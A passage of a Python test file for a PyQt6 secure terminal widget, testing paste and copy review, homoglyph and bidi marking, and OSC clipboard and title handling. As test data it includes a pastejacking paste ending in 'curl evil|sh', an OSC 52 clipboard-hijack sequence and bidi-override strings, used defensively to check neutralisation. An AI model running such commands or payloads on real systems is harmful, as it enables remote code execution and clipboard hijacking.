   or _prompt_bg.color().name() != _alert_bg.color().name(),
   'leftover colour: the prompt after the marker is NOT on the stuck background')
# without the marker the stream is unchanged (shells that do not use bracketed
# paste keep the old readable-but-stuck behaviour; no spurious reset injected).
eq(lo._reset_leftover_sgr('\x1b[41mx'), '\x1b[41mx',
   'leftover colour: no prompt marker -> stream passes through unchanged')
eq(lo._reset_leftover_sgr('out\x1b[?2004hPS> '),
   'out\x1b[0m\x1b[?2004hPS> ',
   'leftover colour: an SGR reset is injected at the prompt marker')

# --- a prompt after output with NO trailing newline starts on a fresh line ----
# `head -c N /dev/urandom` emits no trailing newline, so stock bash glues its
# next prompt onto the last output byte. At the prompt-start marker, end that
# mid-line so the prompt gets its own line -- and do nothing when already at
# column 0 (e.g. output that ended in a newline, or zsh's PROMPT_SP).
_DFLT = {'fg': None, 'bg': None, 'bold': False}
_nc, _nk, _, _, _ = _S.feed_line_edits([], 0, dict(_DFLT), 'abc' + _S.PROMPT_START + 'PS> ')
eq([''.join(c for c, _ in ln) for ln in _nc], ['abc'],
   'prompt newline: un-terminated output before the marker is ended into its line')
eq(''.join(c for c, _ in _nk), 'PS> ',
   'prompt newline: the prompt starts on a fresh line, not glued to the output')
_znl, _zk, _, _, _ = _S.feed_line_edits([], 0, dict(_DFLT), 'abc\n' + _S.PROMPT_START + 'PS> ')
eq([''.join(c for c, _ in ln) for ln in _znl], ['abc'],
   'prompt newline: a trailing newline already ended the line -- no spurious blank')
# zsh/zle emits the bracketed-paste marker AFTER printing the prompt (bash sends
# it before). With no printable text after the marker the prompt is already on
# the row, so flushing here would push it onto its own line and drop the cursor
# below it (the reported bug). It must NOT be flushed.
_zsh_raw = '[user ~]% ' + _S.PROMPT_START
_zshc, _zshk, _zshcol, _, _ = _S.feed_line_edits([], 0, dict(_DFLT), _zsh_raw)
eq([''.join(c for c, _ in ln) for ln in _zshc], [],
   'zsh prompt: a marker AFTER the prompt does not flush the prompt onto its own line')
eq(''.join(c for c, _ in _zshk), '[user ~]% ',
   'zsh prompt: the prompt stays on the current row with the cursor after it')
eq(_zshcol, len('[user ~]% '), 'zsh prompt: the cursor column is at the prompt end')
# still not flushed when only escapes (no printable text) follow the marker
_zec, _zek, _, _, _ = _S.feed_line_edits(
    [], 0, dict(_DFLT), '[user ~]% ' + _S.PROMPT_START + '\x1b[0m')
eq(''.join(c for c, _ in _zek), '[user ~]% ',
   'zsh prompt: a trailing SGR after the marker still does not flush')

# --- security: an app cannot recolour or HIDE a neutralised marking -----------
# A marking (the box glyph, or a Reveal/Detail <U+XXXX> badge -- same key, so the
# same rules across every display mode). With coloured markings ON (default) it
# is coloured by its RISK CLASS, never by the SGR an app set around it, so hostile
# output can neither recolour a box to blend in nor forge one. With markings OFF
# (app colours on) a box takes the app colour but through the contrast guard, so
# it still cannot be painted invisible.
mk = SecureTerminal(command='/bin/cat')
mk.apply_colors(True)
mk.apply_theme('dark')
_bidi = (_S.MARK_KEY, 'bidi', 0x202E)                 # a RIGHT-TO-LEFT OVERRIDE
eq(mk._fmt_from_key(_bidi).foreground().color().name(), mark_fg(mk, 'bidi'),
   'marking: coloured by risk class (bidi), an app cannot recolour it')
# On the dark theme a dangerous class carries a risk-class background BAND (a fg-only
# tint was optically swallowed by the near-black base). The band is OURS, by class --
# an app still cannot control it; it is not the app's SGR.
eq(mk._fmt_from_key(_bidi).background().color().name(), mark_bg(mk, 'bidi'),
   'marking: a bidi box wears the risk-class band on the dark theme, not an app colour')
_risk_classes = ('bidi', 'invisible', 'control', 'nonascii', 'confusable', 'combining')
_risk_cols = [mk._fmt_from_key((_S.MARK_KEY, c, 0x41)).foreground().color().name()
              for c in _risk_classes]
eq(len(set(_risk_cols)), len(_risk_classes),
   'marking: the six risk classes get six distinct colours')
ok(all(c in mk.MARKING_COLORS[mk._theme] for c in _risk_classes),
   'marking: every risk class has a configured colour')
# a homoglyph (confusable) is flagged in a DIFFERENT colour than honest foreign text
ok(mark_fg(mk, 'confusable') != mark_fg(mk, 'nonascii'),
   'marking: a look-alike (confusable) is louder than plain non-ASCII, not the same colour')
# a combining mark (Zalgo) is split off from honest foreign text: its own class,
# its own louder colour -- the taxonomy collision that made marks vanish is gone.
ok(mark_fg(mk, 'combining') != mark_fg(mk, 'nonascii'),
   'marking: a combining mark is its own class, louder than plain non-ASCII')
# markings OFF: the box carries the app's own SGR -- an app trying to hide it by
# painting it its background colour is still forced readable by the contrast guard.
_hide = tuple(sorted({'fg': 0, 'bg': 0, 'bold': False}.items()))    # black-on-black
_hf = mk._fmt_from_key((_S.MARK_KEY, _hide, 0x202E))
ok(_hf.background().style() == Qt.BrushStyle.NoBrush
   or _hf.foreground().color().name() != _hf.background().color().name(),
   'marking: an app colour on a box is contrast-guarded -- fg never equals bg')

# --- every theme: risk-class marking colours stay readable, and a hide attempt
# --- is guarded regardless of theme -------------------------------------------
# The risk colours are theme-keyed, and each fg must read on WHATEVER it is shown
# on: its risk-class band where one is set (the dark dangerous classes), else the
# theme base (light, and honest 'nonascii'). Pinned here per theme. The box-hiding
# guard must also hold in every theme, not just dark.
from secure_terminal.terminal import THEMES as _THEMES2, _rgb as _rgb4   # noqa: E402
from secure_terminal.sanitize import too_close as _tc4                   # noqa: E402
from PyQt6.QtGui import QColor as _QC4                                    # noqa: E402
_thmk = SecureTerminal(command='/bin/cat')
_thmk.apply_colors(True)
for _theme in ('dark', 'light'):
    _thmk.apply_theme(_theme)
    _bg_rgb = _rgb4(_QC4(_THEMES2[_theme][0]))
    for _cls, _spec in _thmk.MARKING_COLORS[_theme].items():
        _on = _rgb4(_QC4(_spec['bg'])) if _spec['bg'] is not None else _bg_rgb
        ok(not _tc4(_rgb4(_QC4(_spec['fg'])), _on),
           'marking colour %s reads on its %s-theme background' % (_cls, _theme))
    # a program painting a box its own bg colour is forced readable in this theme
    for _c in (0, 7, 15):
        _hk = tuple(sorted({'fg': _c, 'bg': _c, 'bold': False}.items()))
        _hfmt = _thmk._fmt_from_key((_S.MARK_KEY, _hk, 0x202E))
        _fg = _rgb4(_hfmt.foreground().color())
        _bgb = _hfmt.background()
        _bg = _rgb4(_bgb.color()) if _bgb.style() != Qt.BrushStyle.NoBrush else _bg_rgb
        ok(not _tc4(_fg, _bg),
           'hide attempt (palette %d on itself) is contrast-guarded on the %s theme'
           % (_c, _theme))
# apply_theme sets the expected base palette for each theme
for _theme, _base in (('dark', '#14161b'), ('light', '#ffffff')):
    _thmk.apply_theme(_theme)
    eq(_thmk.palette().color(_thmk.palette().ColorRole.Base).name(), _base,
       'apply_theme sets the %s base background' % _theme)

# the shipped default theme is LIGHT: a fresh widget with no theme configured comes
# up light (white base), not dark.
_deft = SecureTerminal(command='/bin/cat')
eq(_deft.current_theme(), 'light', 'a fresh widget defaults to the light theme')
eq(_deft.palette().color(_deft.palette().ColorRole.Base).name(), '#ffffff',
   'the default (light) theme paints a white base')
_deft.close()

# --- louder marking tint: BOTH themes give the dangerous classes a background BAND
# --- (a fg-only tint was optically swallowed by the base and vanished); honest
# --- 'nonascii' stays fg-only in both. Light is the shipped default, so its bands
# --- are the primary case. Exercise BOTH branches of the optional-band code (bg set
# --- / bg None) in BOTH renderers, on BOTH themes. A theme toggle clears both
# --- marking caches, so no stale band survives a switch.
_band = SecureTerminal(command='/bin/cat', tui=True)
_band.apply_mode('box')                       # neutralize -> risk-class colouring
_band.apply_markings(True)
for _bt in ('light', 'dark'):
    _band.apply_theme(_bt)
    # CLI line renderer (_fmt_from_key): a dangerous class wears its band; nonascii none.
    _cf = _band._fmt_from_key((_S.MARK_KEY, 'combining', 0x0301))
    eq(_cf.background().color().name(), mark_bg(_band, 'combining'),
       'line renderer: a combining marking wears its %s risk band (bg-set branch)' % _bt)
    _nf = _band._fmt_from_key((_S.MARK_KEY, 'nonascii', 0x4E2D))
    ok(_nf.background().style() == Qt.BrushStyle.NoBrush,
       'line renderer: honest nonascii stays fg-only on %s (bg-None branch)' % _bt)
    # TUI grid renderer (_grid_cell_format): the same two branches.
    _gc = _band._grid_cell_format(_FakeCell(chr(0x0301)), _BX)  # combining -> banded
    eq(_gc.background().color().name(), mark_bg(_band, 'combining'),
       'grid renderer: a combining cell wears its %s risk band (bg-set branch)' % _bt)
    _gn = _band._grid_cell_format(_FakeCell(chr(0x4E2D)), _BX)  # honest foreign -> none
    ok(_gn.background().style() == Qt.BrushStyle.NoBrush,
       'grid renderer: honest nonascii stays fg-only on %s (bg-None branch)' % _bt)
_band.close()

# --- paste gating (async review: hold, then dispatch a choice) ----------------
p = SecureTerminal(command='/bin/cat')
psent = spy_writes(p)
# a risky paste is HELD and a review requested; nothing is sent until a choice is
# dispatched (no blocking modal). Track the requests via the signal.
_reviews = []
p.paste_review_requested.connect(lambda raw, delay: _reviews.append((raw, delay)))
mime = QMimeData()
mime.setText('echo hi\n')
p.insertFromMimeData(mime)
# SECURITY: a newline-terminated single-line paste must NOT auto-execute -- the
# trailing submit is stripped so the command lands at the prompt awaiting the
# user's own Enter (it still crosses without a review; only the auto-run is
# removed).
eq(psent, [b'echo hi'], 'a single-line paste is delivered WITHOUT its trailing submit')
eq(_reviews, [], 'a clean single-line paste raises no review')
psent.clear()
# F3: a MULTI-LINE plain-ASCII paste is held for review too, so a hidden second
# command cannot run the instant you paste (default 'unicode' warn mode).
mime_ml = QMimeData()
mime_ml.setText('echo ok\ncurl evil|sh\n')
p.insertFromMimeData(mime_ml)
eq(psent, [], 'F3: a multi-line ASCII paste is held -- nothing reaches the shell yet')
ok(p.review_pending() and len(_reviews) == 1,
   'F3: a multi-line plain-ASCII paste raises a review (pastejacking held)')
p.dispatch_pending_paste('reject')
_reviews.clear()
psent.clear()
# a paste with a homoglyph (Cyrillic a) plus a bidi override: held for review
mime2 = QMimeData()
mime2.setText('pay' + chr(0x0430) + 'l' + chr(0x202E) + '\n')
p.insertFromMimeData(mime2)
eq(psent, [], 'a risky paste is held -- nothing reaches the shell until a choice')
ok(p.review_pending() and len(_reviews) == 1, 'a risky paste raises exactly one review')
# reject -> nothing sent, pending cleared
p.dispatch_pending_paste('reject')
eq(psent, [], 'rejected paste sends nothing')
ok(not p.review_pending(), 'reject clears the held paste')
# stripped -> ASCII only
p.insertFromMimeData(mime2)
p.dispatch_pending_paste('stripped')
eq(psent, [b'payl'],
   'stripped paste sends ASCII only (homoglyph + bidi dropped, no auto-submit)')
psent.clear()
# unicode -> keeps the printable homoglyph, still drops the bidi override
p.insertFromMimeData(mime2)
p.dispatch_pending_paste('unicode')
eq(psent, [('pay' + chr(0x0430) + 'l').encode('utf-8')],
   'unicode paste keeps the printable homoglyph but still drops the bidi override')
psent.clear()
# dispatch with nothing pending is a no-op -- a stale paste can never be re-sent
p.dispatch_pending_paste('unicode')
eq(psent, [], 'dispatch with no held paste sends nothing')
# a paste that is ONLY newline(s) becomes empty once its trailing submit is
# stripped -- nothing (not even a bare submit) reaches the shell.
psent.clear()
_pnl = QMimeData()
_pnl.setText('\n')
p.insertFromMimeData(_pnl)
eq(psent, [], 'a newline-only paste delivers nothing (no bare auto-submit)')

# regression (Fix #1, the user's repro): pasting a copied prompt line that ended
# in a newline AUTO-EXECUTED it -- the shell ran 'user@...%: not found', then its
# error-prompt redraw (a CR + short reprint) overwrote the line start, mangling
# 'user@work-claude' to '<k-claude'. The paste must never auto-execute: its
# trailing submit is stripped so it waits at the prompt, and the echoed text then
# renders verbatim (no CR-overwrite redraw to corrupt it).
_pr = SecureTerminal(command='/bin/cat')
_pr._mode = 'show'
_prsent = spy_writes(_pr)
_prmime = QMimeData()
_prmime.setText('user@work-claude:~/x% user@y% \n')
_pr.insertFromMimeData(_prmime)
ok(_prsent and not any(b.endswith(b'\r') for b in _prsent),
   'a pasted prompt line is delivered WITHOUT a trailing submit -- it cannot auto-run')
_pr._feed_line('user@work-claude:~/x% user@y% ')     # the shell's verbatim echo
_prdoc = _pr.toPlainText()
ok('user@work-claude' in _prdoc and '<k' not in _prdoc,
   'a pasted prompt string renders verbatim -- no <k line-start corruption')
_pr.close()

# --- paste warning: three modes (always / if-unicode default / never) ---------
eq(p.current_paste_warn(), 'unicode',
   'a new terminal defaults to warning only when a paste carries unicode/control')
_clean = QMimeData()
_clean.setText('echo ok\n')
_dirty = QMimeData()
_dirty.setText('echo ' + chr(0x0430) + '\n')

# default 'unicode': a clean ASCII paste bypasses review; a unicode one holds.
_reviews.clear(); psent.clear()
p.insertFromMimeData(_clean)
eq(_reviews, [], 'if-unicode mode: a clean ASCII paste is not questioned')
eq(psent, [b'echo ok'],
   'if-unicode mode: the clean paste goes straight through, minus its auto-submit')
_reviews.clear()
p.insertFromMimeData(_dirty)
eq(len(_reviews), 1, 'if-unicode mode: a unicode paste is questioned (held)')
p.dispatch_pending_paste('reject')

# 'never': not even a unicode/control paste holds. Opting out of review preserves
# FUNCTION -- printable unicode is KEPT, not stripped to ASCII (still neutralizing
# control/bidi/invisible injection) -- and the unreviewed crossing is surfaced via
# the risk lamp rather than by silently mangling the content.
p.apply_paste_warn('never')
eq(p.current_paste_warn(), 'never', 'apply_paste_warn switches the mode')
_reviews.clear(); psent.clear()
p.insertFromMimeData(_dirty)
eq(_reviews, [], 'never mode: even a unicode paste is not questioned')
eq(psent, [b'echo \xd0\xb0'],
   'never mode: the unicode paste is KEPT (not stripped) -- disabling review does '
   'not mangle deliberately pasted unicode -- but its trailing submit is still '
   'dropped, so even an unreviewed paste never auto-executes')

# 'always': even a clean ASCII paste holds for review.
p.apply_paste_warn('always')
_reviews.clear(); psent.clear()
p.insertFromMimeData(_clean)
eq(len(_reviews), 1, 'always mode: even a clean ASCII paste is questioned (held)')
eq(psent, [], 'always mode: nothing sent until a choice')
p.dispatch_pending_paste('reject')

# an unknown mode falls back to the safe default rather than trusting it.
p.apply_paste_warn('bogus')
eq(p.current_paste_warn(), 'unicode', 'an unknown paste-warn mode falls back to if-unicode')
p.apply_paste_warn('unicode')

# --- copy review (text going OUT to the clipboard; shared bar, own setting) ----
from PyQt6.QtGui import QGuiApplication as _QGA3          # noqa: E402
cp = SecureTerminal(command='/bin/cat')
cp._mode = 'show'                                        # Show keeps real glyphs
eq(cp.current_copy_warn(), 'unicode', 'a new terminal defaults copy_warn to if-unicode')
_creq = []
cp.copy_review_requested.connect(lambda raw, delay: _creq.append((raw, delay)))
# put a homoglyph line into the doc and select it
feed_output(cp, ('git ' + chr(0x0430) + 'dd\n').encode('utf-8'))
cp.selectAll()
_QGA3.clipboard().setText('OLD')
cp.copy()
ok(cp.review_pending() and len(_creq) == 1 and _QGA3.clipboard().text() == 'OLD',
   'a copy carrying unicode is HELD for review -- nothing reaches the clipboard yet')
# copy stripped -> ASCII only on the clipboard
cp.dispatch_pending_copy('stripped')
eq(_QGA3.clipboard().text(), 'git dd\n', 'copy stripped puts ASCII only (homoglyph dropped)')
cp.selectAll(); cp.copy(); cp.dispatch_pending_copy('unicode')
eq(_QGA3.clipboard().text(), 'git ' + chr(0x0430) + 'dd\n',
   'copy with unicode keeps the printable homoglyph')
# reject -> the clipboard is left untouched
_QGA3.clipboard().setText('KEEP'); cp.selectAll(); cp.copy()
cp.dispatch_pending_copy('reject')
eq(_QGA3.clipboard().text(), 'KEEP', 'a rejected copy leaves the clipboard unchanged')
# 'never' copies as displayed without a prompt; 'always' reviews even plain ASCII
cp.apply_copy_warn('never')
_creq.clear(); _QGA3.clipboard().setText('X'); cp.selectAll(); cp.copy()
ok(not _creq and _QGA3.clipboard().text().startswith('git '),
   'never mode: a copy goes straight to the clipboard, no review')
_ascii = SecureTerminal(command='/bin/cat'); _ascii.apply_copy_warn('always')
_areq = []
_ascii.copy_review_requested.connect(lambda raw, delay: _areq.append((raw, delay)))
feed_output(_ascii, b'plain ascii\n'); _ascii.selectAll(); _ascii.copy()
ok(len(_areq) == 1, 'always mode: even a plain-ASCII copy is reviewed')
# a copy review carries NO countdown (copy is not executed): delay is 0
eq(_areq[0][1], 0, 'copy review requests delay 0 (no anti-fat-finger gate needed)')
_ascii.dispatch_pending_copy('reject')
cp.apply_copy_warn('bogus')
eq(cp.current_copy_warn(), 'unicode', 'an unknown copy-warn mode falls back to if-unicode')

# the STANDARD right-click Copy fires Qt's non-virtual C++ copy(), which would
# bypass the reviewed copy() override; the terminal reroutes it so a context-menu
# copy is reviewed too (not just Ctrl+Shift+C).
cp.apply_copy_warn('unicode')
from PyQt6.QtCore import QPoint as _QPoint2                # noqa: E402
_menu = cp._reviewed_context_menu(_QPoint2(5, 5))
_copy_act = [a for a in _menu.actions() if a.objectName() == 'edit-copy'][0]
_creq.clear(); _QGA3.clipboard().setText('OLD'); cp.selectAll()
_copy_act.trigger()
ok(cp.review_pending() and len(_creq) == 1 and _QGA3.clipboard().text() == 'OLD',
   'the context-menu Copy is routed through the copy review, not straight to the clipboard')
cp.dispatch_pending_copy('reject')

# --- FIX A: multi-path copy-oracle for Show-mode inert display glyphs ----------
# A user copied a boxed cell and got only spaces: the ASCII export paths dropped the
# inert DISPLAY glyph (the U+25A1 neutralization box, and Show-mode structural
# box-drawing shown as its real glyph) to NOTHING, so a box present on screen
# vanished on the clipboard -- security-SAFE (the raw dangerous byte is never in the
# text) but "silently wrong". Feed a payload with BOTH a neutralized/boxed cell (a
# bidi override, shown as the box) AND a structural box-drawing run, in TUI Show
# mode, then assert EVERY export path holds three invariants:
#   * NEVER emits the raw dangerous codepoint (U+202E) -- the leak guard;
#   * NEVER collapses the boxed region to whitespace-only -- the silent-loss guard;
#   * carries a non-empty inert ASCII stand-in for the box / structural glyphs.
from PyQt6.QtGui import QGuiApplication as _QGA_ora            # noqa: E402
_ORA_BOX = chr(0x25A1)                              # U+25A1 WHITE SQUARE (the box)
_ORA_RLO = chr(0x202E)                              # RIGHT-TO-LEFT OVERRIDE (bidi)
# No .show()/pump() here: _render_tui paints the grid synchronously and leaves no
# pending debounced-paint timer, so this block is hermetic -- it cannot perturb the
# event-loop timing of a later test.
_ora = SecureTerminal(command='/bin/cat', tui=True)
_ora.apply_mode('show')
_ora.apply_copy_warn('always')                      # force the copy review flow
# row: x <boxed RLO> y  then DEC line-drawing 'lqk' -> real box-drawing glyphs
_ora._feed_stream(('x' + _ORA_RLO + 'y ').encode() + b'\x1b(0lqk\x1b(B\r\n')
_ora._render_tui()
_oratxt = _ora.toPlainText()
ok(_ORA_BOX in _oratxt, 'copy-oracle: the bidi cell is shown as the neutralization box')
ok(any(0x2500 <= ord(c) <= 0x257F for c in _oratxt),
   'copy-oracle: the DEC line-drawing renders as real box-drawing glyphs')

def _ora_copy(action):
    _QGA_ora.clipboard().setText('SENTINEL')
    _ora.selectAll()
    _ora.copy()
    _ora.dispatch_pending_copy(action)
    return _QGA_ora.clipboard().text()

_ora.selectAll()
_ora_prim = _ora.createMimeDataFromSelection().text()   # PRIMARY / drag path
_ora_strip = _ora_copy('stripped')                      # Ctrl+C review 'stripped'
_ora_uni = _ora_copy('unicode')                         # Ctrl+C review 'unicode'
_ora_plain = _ora.toPlainText()
_ora_scr = _ora.transcript_text()

# Every path: never the raw dangerous codepoint, never whitespace-only.
for _lbl, _exp in (('PRIMARY/drag', _ora_prim), ('copy stripped', _ora_strip),
                   ('copy unicode', _ora_uni), ('toPlainText', _ora_plain),
                   ('transcript_text', _ora_scr)):
    ok(_ORA_RLO not in _exp,
       'copy-oracle %s: never emits the raw bidi override (leak guard)' % _lbl)
    ok(_exp.strip() != '',
       'copy-oracle %s: the boxed region never collapses to whitespace-only' % _lbl)

# The two ASCII strip paths map the box -> '_' and the box-drawing -> an ASCII shape,
# instead of dropping them (the silent-loss canary: '_' is ABSENT on the old code).
for _lbl, _exp in (('PRIMARY/drag', _ora_prim), ('copy stripped', _ora_strip)):
    ok(all(ord(c) < 128 for c in _exp),
       'copy-oracle %s: pure ASCII (no glyph rides out unreviewed)' % _lbl)
    ok('_' in _exp,
       'copy-oracle %s: the neutralized box exports as ASCII _ (not lost)' % _lbl)
    ok(any(c in '+-|#' for c in _exp),
       'copy-oracle %s: the structural box-drawing exports an ASCII stand-in' % _lbl)
# The 'unicode' opt-in keeps the inert box + structural glyph AS glyphs (never the
# raw override) -- FIX A leaves this correct path untouched.
ok(_ORA_BOX in _ora_uni,
   'copy-oracle copy unicode: keeps the inert box glyph (opted-in real unicode)')
ok(any(0x2500 <= ord(c) <= 0x257F for c in _ora_uni),
   'copy-oracle copy unicode: keeps the structural box-drawing glyph')
# transcript_text expands the box to its NAMED source codepoint (lossless save).
ok('U+202E' in _ora_scr,
   'copy-oracle transcript_text: the box expands to the named source codepoint')
_ora.close()

# A boxed cell surrounded only by spaces is the sharpest silent-loss case: on the old
# code the ASCII paths dropped it and the whole selection was whitespace-only.
_orb = SecureTerminal(command='/bin/cat', tui=True)
_orb.apply_mode('show')
_orb._feed_stream((' ' + _ORA_RLO + ' \r\n').encode())
_orb._render_tui()
_orb.selectAll()
_orb_prim = _orb.createMimeDataFromSelection().text()
ok(_orb_prim.strip() != '' and '_' in _orb_prim,
   'copy-oracle: a space-flanked box copies as _ (never a whitespace-only string)')
ok(_ORA_RLO not in _orb_prim,
   'copy-oracle: the space-flanked box never leaks the raw override')
_orb.close()

# FIX B end-to-end, refined by task #36: claude-code prints "<U+276F><U+00A0>Try ..."
# as its prompt. The reported "box icon" is the trailing U+00A0 NO-BREAK SPACE (blank
# non-ASCII). Task #36 shows it as the DISTINCT space marker (SPACE_MARK), not a full
# box, so the line stays readable -- yet the marker is a non-ASCII glyph that can never
# pose as a plain space, every text export maps it to '_' (never ' '), and a saved
# transcript names its codepoint inline. The caret U+276F renders as its own glyph.
_SPMARK = chr(0x2423)                               # SPACE_MARK (U+2423 OPEN BOX)
_clp = SecureTerminal(command='/bin/cat', tui=True)
_clp.apply_mode('show')
_clp._feed_stream((chr(0x276F) + chr(0x00A0) + 'Try\r\n').encode())
_clp._render_tui()
# the RAW on-screen document (QTextDocument.toPlainText, not the widget's export
# override): the caret glyph plus the DISTINCT space marker, never a raw NBSP or a
# full box, and never a plain ASCII space in the marker's place.
_clp_screen = _clp.document().toPlainText()
ok(chr(0x276F) in _clp_screen,
   'claude prompt: the caret U+276F renders as its own glyph on screen (not boxed)')
ok(_SPMARK in _clp_screen,
   'claude prompt: the trailing NBSP is shown as the distinct space marker')
ok(_ORA_BOX not in _clp_screen,
   'claude prompt: the NBSP is the space marker, not the full box')
ok(chr(0x00A0) not in _clp_screen,
   'claude prompt: the marker never renders as the raw NBSP')
# EXPORT (toPlainText): the marker maps to '_', leaving no marker and no raw NBSP.
_clptxt = _clp.toPlainText()
ok('_' in _clptxt and 'Try' in _clptxt,
   'claude prompt: export maps the space marker to _')
ok(_SPMARK not in _clptxt and chr(0x00A0) not in _clptxt,
   'claude prompt: export leaves no marker glyph and no raw NBSP')
# COPY (PRIMARY selection): pure ASCII, the marker as '_', never a space.
_clp.selectAll()
_clp_prim = _clp.createMimeDataFromSelection().text()
ok('_' in _clp_prim and 'Try' in _clp_prim,
   'claude prompt: copy keeps the marked NBSP as _ and the following text')
ok(chr(0x00A0) not in _clp_prim and _SPMARK not in _clp_prim,
   'claude prompt: copy never emits a raw NBSP or the marker glyph')
ok(all(ord(c) < 128 for c in _clp_prim),
   'claude prompt: the copied prompt row is pure ASCII (the confusable caret is dropped)')
# TRANSCRIPT (saved record): lossless -- the marker is named inline in Detail form.
_clp_tr = _clp.transcript_text()
ok('<U+00A0 NO-BREAK SPACE>' in _clp_tr,
   'claude prompt: a saved transcript names the NBSP inline (<U+00A0 NO-BREAK SPACE>)')
ok(_SPMARK not in _clp_tr and chr(0x00A0) not in _clp_tr,
   'claude prompt: the transcript leaves no marker glyph and no raw NBSP')
_clp.close()

# --- TUI mode (pyte is a required dependency: fail closed, do not skip) -------
ok(tui_available(), 'python3-pyte available for TUI mode')
if tui_available():
    tui = SecureTerminal(command='/bin/cat', tui=True)
    tui.resize(700, 300)
    tui.show()
    pump(50)
    ok(tui.tui_active(), 'tui active')
    # cursor addressing: place text at row 3 col 5 (1-indexed)
    tui.apply_mode('show')
    tui._stream.feed(b'\x1b[2J\x1b[3;5HPLACED')
    tui._render_tui()
    rows = tui.toPlainText().split('\n')
    hit = [(i, r.index('PLACED')) for i, r in enumerate(rows) if 'PLACED' in r]
    eq(hit[:1], [(2, 4)], 'tui cursor addressing')
    # full-screen program layout (what vim/htop/tmux emit): a box drawn with
    # box-drawing characters, cursor-addressed content, and a bottom status line.
    # In show mode the box-drawing glyphs survive; the grid places every piece.
    fs = SecureTerminal(command='/bin/cat', tui=True)
    fs.resize(700, 300)
    fs.show()
    pump(50)
    fs.apply_mode('show')
    _last = fs._screen.lines                   # actual grid height in rows
    _tl, _tr = chr(0x250C), chr(0x2510)        # box corners (vim/tmux borders)
    _h, _v = chr(0x2500), chr(0x2502)
    fs._stream.feed(('\x1b[2J\x1b[1;1H' + _tl + _h * 6 + _tr
                     + '\x1b[2;1H' + _v + ' vim  ' + _v
                     + ('\x1b[%d;1H' % _last) + '-- INSERT --').encode('utf-8'))
    fs._render_tui()
    _fr = fs.toPlainText().split('\n')
    ok(_fr[0].startswith(_tl + _h * 6 + _tr), 'tui draws the top box border')
    ok(_v + ' vim  ' + _v in _fr[1], 'tui places boxed content on row 2')
    ok(_fr[_last - 1].startswith('-- INSERT --'),
       'tui places the status line on the last row')
    # the same frame in box mode: box-drawing glyphs become _, ASCII stays
    fs.apply_mode('box')
    fs._render_tui()
    _sr = fs.toPlainText().split('\n')
    ok(_tl not in _sr[0] and '_' in _sr[0], 'box mode neutralizes box glyphs')
    ok(_sr[_last - 1].startswith('-- INSERT --'), 'box keeps the ASCII status line')
    fs.shutdown()
    # a pyte parser error on real program output (private SGR that some pyte
    # builds mishandle -- htop/vim/tmux emit these) must be contained, never
    # crash the terminal
    crash = SecureTerminal(command='/bin/cat', tui=True)
    crash.resize(700, 300)
    crash.show()
    pump(50)
    crash._feed_stream(b'\x1b[1;2;3?m')          # private SGR: pyte may raise
    crash._feed_stream(b'ok\r\n')
    crash._render_tui()
    ok('ok' in crash.toPlainText(), 'pyte parser error contained; terminal survives')
    # the rest of the pyte 0.8.0 crash-bug family (extra CSI params, a private CSI
    # final, an unhandled erase 'how', VPA under DECOM, a non-ASCII digit in a
    # param) must be swallowed by the same feed guard -- feed each, then confirm
    # later output still renders.
    for _seq in (b'\x1b[1;2A', b'\x1b[?0A', b'\x1b[3K', b'\x1b[4J',
                 b'\x1b[?6h\x1b[5d', b'\x1b[\xc2\xb3A'):
        crash._feed_stream(_seq)
    crash._feed_stream(b'ok2\r\n')
    crash._render_tui()
    ok('ok2' in crash.toPlainText(),
       'pyte crash-bug family (A/C/D/F) contained; terminal still renders')
    crash.shutdown()
    # scrolling output rendered frame-by-frame (the live path) must NOT be
    # double-spaced: _delete_grid must eat the newline joining scrollback to the
    # grid, or every scrolled row leaves a spurious empty block (a blank line
    # between each line -- seen with zsh's completion pager listing).
    ds = SecureTerminal(command='/bin/cat', tui=True)
    ds.resize(600, 300)
    ds.show()
    pump(30)
    _rows = ds._screen.lines
    for _k in range(_rows * 3):                 # enough to scroll well past one screen
        ds._feed_stream(('row%02d\r\n' % _k).encode())
        ds._render_tui()                        # one render per feed, like the timer
    _dl = ds.toPlainText().split('\n')
    _between = [i for i in range(1, len(_dl) - 1)
                if not _dl[i].strip() and _dl[i - 1].strip() and _dl[i + 1].strip()]
    eq(len(_between), 0,
       'TUI scrolling output is not double-spaced (no blank line between rows)')
    ok('row%02d' % (_rows * 3 - 1) in ds.toPlainText(),
       'the latest scrolled row is present')
    ds.shutdown()
    # per-cell bidi neutralized in box mode
    tui.apply_mode('box')
    tui._stream.feed(b'\x1b[10;1Ha\xe2\x80\xaeb')     # a U+202E b
    tui._render_tui()
    ok(chr(0x202E) not in tui.toPlainText(), 'tui bidi neutralized')
    # colour cell renders
    tui.apply_mode('show')
    tui._stream.feed(b'\x1b[12;1H\x1b[32mG\x1b[0m')
    tui._render_tui()
    ok(any(row[x].data == 'G' and row[x].fg == 'green'
           for row in [tui._screen.buffer[y] for y in range(tui._screen.lines)]
           for x in range(tui._screen.columns)), 'tui colour cell')
    # title + notification handling when allowed
    tui.apply_allow_title(True)
    titles: list[str] = []
    notes: list[str] = []
    tui.title_changed.connect(titles.append)
    tui.notified.connect(notes.append)
    tui._stream.feed(b'\x1b]2;My ev\xe2\x80\xaeil Title\x07')
    tui._handle_osc(b'\x1b]2;My ev\xe2\x80\xaeil Title\x07')
    ok(titles and chr(0x202E) not in titles[-1], 'tui title sanitized')
    tui._handle_osc(b'\x1b]9;done\x07')
    ok(notes and notes[-1] == 'done', 'tui notification captured')
    # off: no title emitted
    tui.apply_allow_title(False)
    before = len(titles)
    tui._stream.feed(b'\x1b]2;ignored\x07')
    ok(len(titles) == before, 'allow_title off: the guarded feed path emits no title')
    tui._handle_osc(b'\x1b]2;ignored\x07')  # guard is in _on_readable
    # --- granular OSC handlers: each off by default, honored only when enabled ---
    import base64 as _b64                                   # noqa: E402
    from PyQt6.QtGui import QGuiApplication as _QGA2         # noqa: E402
    _QGA2.clipboard().setText('ORIGINAL')
    # clipboard OSC 52 OFF by default -> a program cannot write the clipboard
    tui._handle_osc(b'\x1b]52;c;' + _b64.b64encode(b'HIJACK') + b'\x07')
    ok(_QGA2.clipboard().text() == 'ORIGINAL',
       'OSC 52 clipboard write is neutralized until osc_clipboard is enabled')
    tui.apply_osc('osc_clipboard', True)
    tui._handle_osc(b'\x1b]52;c;' + _b64.b64encode(b'pasted') + b'\x07')
    ok(_QGA2.clipboard().text() == 'pasted', 'enabled: OSC 52 writes the clipboard')
    _QGA2.clipboard().setText('SECRET')
    ## B2: Check pty REPLY channel for DECLINED clipboard read instead of clipboard text
    _tui_spy = []
    _orig_tui_write = tui._write
